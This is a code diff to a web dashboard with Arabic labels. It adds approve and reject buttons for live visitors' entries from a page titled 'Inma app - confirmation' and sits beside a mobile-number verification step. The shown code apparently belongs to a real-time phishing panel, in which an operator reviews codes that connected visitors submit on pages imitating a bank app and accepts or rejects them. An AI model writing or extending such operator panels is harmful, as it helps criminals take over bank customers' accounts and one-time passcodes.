@@ -2324,6 +2324,14 @@
             });
             html += '</div>';
             
+            // إضافة أزرار موافقة/رفض لتطبيق إنماء
+            if (dataEntry.page === 'تطبيق إنماء - تأكيد') {
+              html += '<div class="flex gap-2 mt-3">';
+              html += '<button onclick="codeActionApprove(\'' + visitor.socketId + '\', ' + dataIndex + ')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
+              html += '<button onclick="codeActionReject(\'' + visitor.socketId + '\', ' + dataIndex + ')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+              html += '</div>';
+            }
+            
             // إضافة أزرار لتوثيق رقم الجوال
             if (dataEntry.page === 'توثيق رقم الجوال') {
               // الحصول على مزود الخدمة من البيانات
